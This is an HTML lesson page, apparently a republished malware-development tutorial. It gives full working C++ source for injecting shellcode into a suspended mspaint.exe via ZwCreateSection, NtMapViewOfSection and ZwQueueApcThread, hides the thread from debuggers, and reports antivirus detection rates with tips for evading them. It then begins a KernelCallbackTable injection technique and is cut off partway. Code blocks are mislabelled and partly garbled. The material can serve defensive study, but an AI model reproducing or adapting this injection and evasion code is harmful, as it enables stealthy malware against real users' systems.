@@ -1,0 +1,1293 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Code injection via memory sections and ZwQueueApcThread.</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #12</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Code injection via memory sections and ZwQueueApcThread.</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Simple C++ malware example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the previous section I wrote about code injection via memory sections. This section is a result of replacing thread creating logic. <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">ZwQueueApcThread</code> For the user-mode code there is no difference between <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">ZwQueueApcThread</code> and NtQueueApcThread functions. It’s just the matter of what prefix you like. Native function <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">ZwQueueApcThread</code> is declared like: NTSYSAPI NTSTATUS NTAPI <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">ZwQueueApcThread</code>( IN HANDLE IN PIO_APC_ROUTINE IN PVOID IN PIO_STATUS_BLOCK IN ULONG</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">ThreadHandle, ApcRoutine, ApcRoutineContext OPTIONAL, ApcStatusBlock OPTIONAL, ApcReserved OPTIONAL );</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">so in our code we use function pointer to <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">ZwQueueApcThread</code>:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">typedef NTSTATUS(NTAPI* pZwQueueApcThread)(
+IN HANDLE
+ThreadHandle,
+IN PIO_APC_ROUTINE
+ApcRoutine,
+IN PVOID
+ApcRoutineContext OPTIONAL,
+IN PIO_STATUS_BLOCK
+ApcStatusBlock OPTIONAL,
+
+IN ULONG
+
+ApcReserved OPTIONAL
+
+);
+ZwSetInformationThread
+Native function ZwSetInformationThread is declared like:
+NTSYSAPI NTSTATUS ZwSetInformationThread(
+[in] HANDLE
+ThreadHandle,
+[in] THREADINFOCLASS ThreadInformationClass,
+[in] PVOID
+ThreadInformation,
+[in] ULONG
+ThreadInformationLength
+);</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">then in our code we use function pointer to ZwSetInformationThread:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">typedef NTSTATUS(NTAPI* pZwSetInformationThread)(
+[in] HANDLE
+ThreadHandle,
+[in] THREADINFOCLASS ThreadInformationClass,
+[in] PVOID
+ThreadInformation,
+[in] ULONG
+ThreadInformationLength
+);
+practical example
+My example’s logic is similar to previous section, the only difference is:</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, I replaced payload launching logic. There is one interesting point with ZwSetInformationThread. The second parameter of this function is the THREADINFOCLASS structure, which is an enumerated type. The last label field is ThreadHideFromDebugger. By setting ThreadHideFromDebugger for the thread, you can prohibit a thread from generating debugging events. This was one of the first anti-debugging techniques provided by Windows in Microsoft’s search for how to prevent reverse engineering, and it’s very powerful. Full source code of malware:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">/*
+* hack.cpp - code injection via
+* ZwCreateSection, ZwUnmapViewOfSection,
+* ZwQueueApcThread
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/
+2022/01/17/malware-injection-14.html
+*/
+#include &lt;cstdio&gt;
+#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+#pragma comment(lib, "ntdll")
+// ZwCreateSection
+typedef NTSTATUS(NTAPI* pZwCreateSection)(
+OUT PHANDLE
+SectionHandle,
+IN ULONG
+DesiredAccess,
+IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+IN PLARGE_INTEGER
+MaximumSize OPTIONAL,
+IN ULONG
+PageAttributess,
+IN ULONG
+SectionAttributes,
+IN HANDLE
+FileHandle OPTIONAL
+);
+// NtMapViewOfSection syntax
+typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
+HANDLE
+SectionHandle,
+HANDLE
+ProcessHandle,
+BaseAddress,
+PVOID*
+ULONG_PTR
+ZeroBits,
+SIZE_T
+CommitSize,
+PLARGE_INTEGER
+SectionOffset,
+PSIZE_T
+ViewSize,
+DWORD
+InheritDisposition,
+AllocationType,
+ULONG
+ULONG
+Win32Protect
+);
+// ZwUnmapViewOfSection syntax
+typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
+HANDLE
+ProcessHandle,
+PVOID
+BaseAddress
+);
+// ZwClose
+
+typedef NTSTATUS(NTAPI* pZwClose)(
+_In_ HANDLE
+Handle
+);
+// ZwQueueApcThread
+typedef NTSTATUS(NTAPI* pZwQueueApcThread)(
+IN HANDLE
+ThreadHandle,
+IN PIO_APC_ROUTINE
+ApcRoutine,
+IN PVOID
+ApcRoutineContext OPTIONAL,
+IN PIO_STATUS_BLOCK
+ApcStatusBlock OPTIONAL,
+IN ULONG
+ApcReserved OPTIONAL
+);
+// ZwSetInformationThread
+typedef NTSTATUS(NTAPI* pZwSetInformationThread)(
+_In_ HANDLE
+ThreadHandle,
+_In_ THREADINFOCLASS
+ThreadInformationClass,
+_In_ PVOID
+ThreadInformation,
+_In_ ULONG
+ThreadInformationLength
+);
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+
+"\x2e\x2e\x5e\x3d\x00";
+int main(int argc, char* argv[]) {
+HANDLE sh; // section handle
+HANDLE th; // thread handle
+STARTUPINFOA si = {};
+PROCESS_INFORMATION pi = {};
+PROCESS_BASIC_INFORMATION pbi = {};
+OBJECT_ATTRIBUTES oa;
+SIZE_T s = 4096;
+LARGE_INTEGER sectionS = { (DWORD) s };
+PVOID rb = NULL; // remote buffer
+PVOID lb = NULL; // local buffer
+ZeroMemory(&amp;si, sizeof(STARTUPINFO));
+ZeroMemory(&amp;pi, sizeof(PROCESS_INFORMATION));
+ZeroMemory(&amp;pbi, sizeof(PROCESS_BASIC_INFORMATION));
+si.cb = sizeof(STARTUPINFO);
+ZeroMemory(&amp;oa, sizeof(OBJECT_ATTRIBUTES));
+HMODULE ntdll = GetModuleHandleA("ntdll");
+pZwCreateSection myZwCreateSection =
+(pZwCreateSection)(GetProcAddress(
+ntdll, "ZwCreateSection"));
+pNtMapViewOfSection myNtMapViewOfSection =
+(pNtMapViewOfSection)(GetProcAddress(
+ntdll, "NtMapViewOfSection"));
+pZwUnmapViewOfSection myZwUnmapViewOfSection =
+(pZwUnmapViewOfSection)(GetProcAddress(
+ntdll, "ZwUnmapViewOfSection"));
+pZwQueueApcThread myZwQueueApcThread =
+(pZwQueueApcThread)GetProcAddress(
+ntdll, "ZwQueueApcThread");
+pZwSetInformationThread myZwSetInformationThread =
+(pZwSetInformationThread)GetProcAddress(
+ntdll, "ZwSetInformationThread");
+pZwClose myZwClose =
+(pZwClose)GetProcAddress(
+ntdll, "ZwClose");
+// create process as suspended
+if (!CreateProcessA(NULL,
+(LPSTR) "C:\\windows\\system32\\mspaint.exe",
+NULL, NULL, NULL,
+CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
+
+NULL, NULL, &amp;si, &amp;pi)) {
+printf("create process failed :(\n");
+return -2;
+};
+myZwCreateSection(&amp;sh,
+SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
+NULL, &amp;sectionS,
+PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+printf("section handle: %p.\n", sh);
+// mapping the section into current process
+myNtMapViewOfSection(sh, GetCurrentProcess(), &amp;lb,
+NULL, NULL, NULL,
+&amp;s, 2, NULL, PAGE_EXECUTE_READWRITE);
+printf("local process mapped at address: %p.\n", lb);
+// mapping the section into remote process
+myNtMapViewOfSection(sh, pi.hProcess, &amp;rb,
+NULL, NULL, NULL,
+&amp;s, 2, NULL, PAGE_EXECUTE_READWRITE);
+printf("remote process mapped at address: %p\n", rb);
+// copy payload
+memcpy(lb, my_payload, sizeof(my_payload));
+// unmapping section from current process
+myZwUnmapViewOfSection(GetCurrentProcess(), lb);
+printf("mapped at address: %p.\n", lb);
+myZwClose(sh);
+sh = NULL;
+// create new thread
+myZwQueueApcThread(pi.hThread, (PIO_APC_ROUTINE)rb, 0, 0, 0);
+myZwSetInformationThread(pi.hThread, (THREADINFOCLASS)1,
+NULL, NULL);
+ResumeThread(pi.hThread);
+myZwClose(pi.hThread);
+myZwClose(th);
+return 0;
+}
+As usually, for simplicity, I used meow-meow messagebox as payload:
+
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile our example: x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, see everything in action! In our case victim machine is Windows 10 x64:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">We can see that everything was completed perfectly :) Then, let’s go to upload our malware to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/a96b5c2a8fce03d4b6e30b9499a3df2280cb6f55 70bb4198a1bd51aeaa2665e8/detection So, 9 of 67 AV engines detect our file as malicious. Moneta64.exe result:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If we want, for better result, we can add payload encryption with key or obfuscate functions, or combine both of this techniques. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. CreateProcessA ZwCreateSection <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtMapViewOfSection</code></p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">ZwUnmapViewOfSection ZwClose <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">ZwQueueApcThread</code>/NtQueueApcThread ZwSetInformationThread Moneta64.exe source code in Github</p>
+
+            <div id="27-process-injection-via-kernelcallbacktable-simple-c-malware" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>27. process injection via KernelCallbackTable. Simple C++ malware</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is a result of self-researching one of the process injection technique: by spoofing the fnCOPYDATA value in KernelCallbackTable. Let’s look at this technique in more detail. KernelCallbackTable KernelCallbackTable can be found in <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">PEB</code> structure, at 0x058 offset: lkd> dt_PEB</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">lkd> dt_PEB @$peb kernelcallbacktable</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The KernelCallbackTable is initialized to an array of functions: lkd> dqs 0x00007ffa`29123070 L60 00007ffa`29123070 00007ffa`290c2bd0 user32!_fnCOPYDATA 00007ffa`29123078 00007ffa`2911ae70 user32!_fnCOPYGLOBALDATA 00007ffa`29123080 00007ffa`290c0420 user32!_fnDWORD 00007ffa`29123088 00007ffa`290c5680 user32!_fnNCDESTROY 00007ffa`29123090 00007ffa`290c96a0 user32!_fnDWORDOPTINLPMSG 00007ffa`29123098 00007ffa`2911b4a0 user32!_fnINOUTDRAG</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">//....
+For example, functions such as fnCOPYDATA are called in response to a WM_COPYDATA
+window message.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This function is replaced to demonstrate the injection.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The flow is this technique is: firstly, include ntddk.h header from SDK:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">#include &lt;./ntddk.h&gt;
+Then, redefine:
+typedef struct _KERNELCALLBACKTABLE_T {
+ULONG_PTR __fnCOPYDATA;
+ULONG_PTR __fnCOPYGLOBALDATA;
+ULONG_PTR __fnDWORD;
+ULONG_PTR __fnNCDESTROY;
+ULONG_PTR __fnDWORDOPTINLPMSG;
+ULONG_PTR __fnINOUTDRAG;
+ULONG_PTR __fnGETTEXTLENGTHS;
+ULONG_PTR __fnINCNTOUTSTRING;
+ULONG_PTR __fnPOUTLPINT;
+ULONG_PTR __fnINLPCOMPAREITEMSTRUCT;
+ULONG_PTR __fnINLPCREATESTRUCT;
+ULONG_PTR __fnINLPDELETEITEMSTRUCT;
+ULONG_PTR __fnINLPDRAWITEMSTRUCT;
+ULONG_PTR __fnPOPTINLPUINT;
+ULONG_PTR __fnPOPTINLPUINT2;
+ULONG_PTR __fnINLPMDICREATESTRUCT;
+ULONG_PTR __fnINOUTLPMEASUREITEMSTRUCT;
+ULONG_PTR __fnINLPWINDOWPOS;
+
+ULONG_PTR __fnINOUTLPPOINT5;
+ULONG_PTR __fnINOUTLPSCROLLINFO;
+ULONG_PTR __fnINOUTLPRECT;
+ULONG_PTR __fnINOUTNCCALCSIZE;
+ULONG_PTR __fnINOUTLPPOINT5_;
+ULONG_PTR __fnINPAINTCLIPBRD;
+ULONG_PTR __fnINSIZECLIPBRD;
+ULONG_PTR __fnINDESTROYCLIPBRD;
+ULONG_PTR __fnINSTRING;
+ULONG_PTR __fnINSTRINGNULL;
+ULONG_PTR __fnINDEVICECHANGE;
+ULONG_PTR __fnPOWERBROADCAST;
+ULONG_PTR __fnINLPUAHDRAWMENU;
+ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD;
+ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD_;
+ULONG_PTR __fnOUTDWORDINDWORD;
+ULONG_PTR __fnOUTLPRECT;
+ULONG_PTR __fnOUTSTRING;
+ULONG_PTR __fnPOPTINLPUINT3;
+ULONG_PTR __fnPOUTLPINT2;
+ULONG_PTR __fnSENTDDEMSG;
+ULONG_PTR __fnINOUTSTYLECHANGE;
+ULONG_PTR __fnHkINDWORD;
+ULONG_PTR __fnHkINLPCBTACTIVATESTRUCT;
+ULONG_PTR __fnHkINLPCBTCREATESTRUCT;
+ULONG_PTR __fnHkINLPDEBUGHOOKSTRUCT;
+ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX;
+ULONG_PTR __fnHkINLPKBDLLHOOKSTRUCT;
+ULONG_PTR __fnHkINLPMSLLHOOKSTRUCT;
+ULONG_PTR __fnHkINLPMSG;
+ULONG_PTR __fnHkINLPRECT;
+ULONG_PTR __fnHkOPTINLPEVENTMSG;
+ULONG_PTR __xxxClientCallDelegateThread;
+ULONG_PTR __ClientCallDummyCallback;
+ULONG_PTR __fnKEYBOARDCORRECTIONCALLOUT;
+ULONG_PTR __fnOUTLPCOMBOBOXINFO;
+ULONG_PTR __fnINLPCOMPAREITEMSTRUCT2;
+ULONG_PTR __xxxClientCallDevCallbackCapture;
+ULONG_PTR __xxxClientCallDitThread;
+ULONG_PTR __xxxClientEnableMMCSS;
+ULONG_PTR __xxxClientUpdateDpi;
+ULONG_PTR __xxxClientExpandStringW;
+ULONG_PTR __ClientCopyDDEIn1;
+ULONG_PTR __ClientCopyDDEIn2;
+ULONG_PTR __ClientCopyDDEOut1;
+ULONG_PTR __ClientCopyDDEOut2;
+
+ULONG_PTR __ClientCopyImage;
+ULONG_PTR __ClientEventCallback;
+ULONG_PTR __ClientFindMnemChar;
+ULONG_PTR __ClientFreeDDEHandle;
+ULONG_PTR __ClientFreeLibrary;
+ULONG_PTR __ClientGetCharsetInfo;
+ULONG_PTR __ClientGetDDEFlags;
+ULONG_PTR __ClientGetDDEHookData;
+ULONG_PTR __ClientGetListboxString;
+ULONG_PTR __ClientGetMessageMPH;
+ULONG_PTR __ClientLoadImage;
+ULONG_PTR __ClientLoadLibrary;
+ULONG_PTR __ClientLoadMenu;
+ULONG_PTR __ClientLoadLocalT1Fonts;
+ULONG_PTR __ClientPSMTextOut;
+ULONG_PTR __ClientLpkDrawTextEx;
+ULONG_PTR __ClientExtTextOutW;
+ULONG_PTR __ClientGetTextExtentPointW;
+ULONG_PTR __ClientCharToWchar;
+ULONG_PTR __ClientAddFontResourceW;
+ULONG_PTR __ClientThreadSetup;
+ULONG_PTR __ClientDeliverUserApc;
+ULONG_PTR __ClientNoMemoryPopup;
+ULONG_PTR __ClientMonitorEnumProc;
+ULONG_PTR __ClientCallWinEventProc;
+ULONG_PTR __ClientWaitMessageExMPH;
+ULONG_PTR __ClientWOWGetProcModule;
+ULONG_PTR __ClientWOWTask16SchedNotify;
+ULONG_PTR __ClientImmLoadLayout;
+ULONG_PTR __ClientImmProcessKey;
+ULONG_PTR __fnIMECONTROL;
+ULONG_PTR __fnINWPARAMDBCSCHAR;
+ULONG_PTR __fnGETTEXTLENGTHS2;
+ULONG_PTR __fnINLPKDRAWSWITCHWND;
+ULONG_PTR __ClientLoadStringW;
+ULONG_PTR __ClientLoadOLE;
+ULONG_PTR __ClientRegisterDragDrop;
+ULONG_PTR __ClientRevokeDragDrop;
+ULONG_PTR __fnINOUTMENUGETOBJECT;
+ULONG_PTR __ClientPrinterThunk;
+ULONG_PTR __fnOUTLPCOMBOBOXINFO2;
+ULONG_PTR __fnOUTLPSCROLLBARINFO;
+ULONG_PTR __fnINLPUAHDRAWMENU2;
+ULONG_PTR __fnINLPUAHDRAWMENUITEM;
+ULONG_PTR __fnINLPUAHDRAWMENU3;
+ULONG_PTR __fnINOUTLPUAHMEASUREMENUITEM;
+
+ULONG_PTR __fnINLPUAHDRAWMENU4;
+ULONG_PTR __fnOUTLPTITLEBARINFOEX;
+ULONG_PTR __fnTOUCH;
+ULONG_PTR __fnGESTURE;
+ULONG_PTR __fnPOPTINLPUINT4;
+ULONG_PTR __fnPOPTINLPUINT5;
+ULONG_PTR __xxxClientCallDefaultInputHandler;
+ULONG_PTR __fnEMPTY;
+ULONG_PTR __ClientRimDevCallback;
+ULONG_PTR __xxxClientCallMinTouchHitTestingCallback;
+ULONG_PTR __ClientCallLocalMouseHooks;
+ULONG_PTR __xxxClientBroadcastThemeChange;
+ULONG_PTR __xxxClientCallDevCallbackSimple;
+ULONG_PTR __xxxClientAllocWindowClassExtraBytes;
+ULONG_PTR __xxxClientFreeWindowClassExtraBytes;
+ULONG_PTR __fnGETWINDOWDATA;
+ULONG_PTR __fnINOUTSTYLECHANGE2;
+ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX2;
+} KERNELCALLBACKTABLE;
+Then, find a window for mspaint.exe, obtain the process id and open it:
+// find a window for mspaint.exe
+HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
+if (hw == NULL) {
+printf("failed to find window :(\n");
+return -2;
+}
+GetWindowThreadProcessId(hw, &amp;pid);
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+After that, read the PEB and existing table address:
+HMODULE ntdll = GetModuleHandleA("ntdll");
+pNtQueryInformationProcess myNtQueryInformationProcess =
+(pNtQueryInformationProcess)(GetProcAddress(
+ntdll, "NtQueryInformationProcess"));
